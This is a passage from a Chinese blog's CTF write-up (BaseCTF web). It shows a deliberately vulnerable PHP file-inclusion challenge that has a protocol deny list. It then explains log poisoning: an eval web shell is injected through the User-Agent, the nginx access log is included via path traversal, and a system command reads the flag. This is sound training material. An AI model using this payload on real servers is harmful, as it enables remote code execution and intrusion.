function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>过滤了所有伪协议，可以采用包含日志的方法</p>
<p><strong>包含Apache、nginx日志文件</strong></p>
<p>默认nginx的日志路径为 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
<p>默认apache<code>/var/log/apache2/access.log</code> <code>/var/log/apache2/access.log</code></p>
<p>或者通过phpinfo()查看</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log</p>
<p>直接访问127.0.0.1&#x2F;&lt;?php phpinfo();&gt;，服务器的日志文件就会解析出这个url,但是被url编码，所以用burpsuite拦截一下更改成未编码的语句</p>
<p>之后通过访问日志文件的位置，执行php代码</p>
<p>注意：如果是UA头注入代码，必须一次写对，如果出错，文件包含执行的时候会报fatal error不再向下解析后续再写入的php代码（环境被污染）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">?file=../../../../../../var/log/nginx/access.log</span><br><span class="line">UA:&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line">post:1=system(&#x27;tac /f*&#x27;);</span><br></pre></td></tr></table></figure>

<p>修改UA进不去的时候试试burp发包</p>
<p><img src="/../images/basectf/5.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.dyinglight.me">Dyinglight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.dyinglight.me/posts/BaseCTF-web-wp/">https://www.dyinglight.me/posts/BaseCTF-web-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.dyinglight.me" target="_blank">Dyinglight's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/sly.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/" title="2024长城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024长城杯</div></div></a></div><div class="next-post pull-right"><a href="/posts/ssti/" title="'ssti'"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">'ssti'</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/sly.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dyinglight</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Dyinglight5"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BaseCTF-web"><span class="toc-number">1.</span> <span class="toc-text">BaseCTF-web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-ez-ser"><span class="toc-number">1.1.</span> <span class="toc-text">[Week2] ez_ser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E4%B8%80%E8%B5%B7%E5%90%83%E8%B1%86%E8%B1%86"><span class="toc-number">1.2.</span> <span class="toc-text">[Week2] 一起吃豆豆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E4%BD%A0%E5%90%AC%E4%B8%8D%E5%88%B0%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3"><span class="toc-number">1.3.</span> <span class="toc-text">[Week2] 你听不到我的声音</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-RCEisamazingwithspace"><span class="toc-number">1.4.</span> <span class="toc-text">[Week2] RCEisamazingwithspace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-Really-EZ-POP"><span class="toc-number">1.5.</span> <span class="toc-text">[Week2] Really EZ POP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E6%95%B0%E5%AD%A6%E5%A4%A7%E5%B8%88"><span class="toc-number">1.6.</span> <span class="toc-text">[Week2] 数学大师</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week2-%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82-MD5"><span class="toc-number">1.7.</span> <span class="toc-text">[Week2] 所以你说你懂 MD5?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-ez-php-jail"><span class="toc-number">1.8.</span> <span class="toc-text">[Week3] ez_php_jail</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-highlight-file-f"><span class="toc-number">1.8.1.</span> <span class="toc-text">1. highlight_file(&#39;&#x2F;f*&#39;)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-highlight-file-glob-f-0"><span class="toc-number">1.8.2.</span> <span class="toc-text">2. highlight_file(glob(&quot;&#x2F;f*&quot;)[0])</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Week3-%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C"><span class="toc-number">1.9.</span> <span class="toc-text">[Week3] 滤个不停</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="linux应急响应">linux应急响应</a><time datetime="2024-10-13T04:26:24.000Z" title="发表于 2024-10-13 12:26:24">2024-10-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ThinkPHP5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="ThinkPHP5反序列化漏洞复现">ThinkPHP5反序列化漏洞复现</a><time datetime="2024-10-06T07:52:44.000Z" title="发表于 2024-10-06 15:52:44">2024-10-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/SCTF-web/" title="SCTF-web">SCTF-web</a><time datetime="2024-09-28T01:04:34.000Z" title="发表于 2024-09-28 09:04:34">2024-09-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/" title="2024长城杯">2024长城杯</a><time datetime="2024-09-08T01:13:32.000Z" title="发表于 2024-09-08 09:13:32">2024-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/BaseCTF-web-wp/" title="'BaseCTF-web-wp'">'BaseCTF-web-wp'</a><time datetime="2024-08-26T08:28:12.000Z" title="发表于 2024-08-26 16:28:12">2024-08-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Dyinglight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>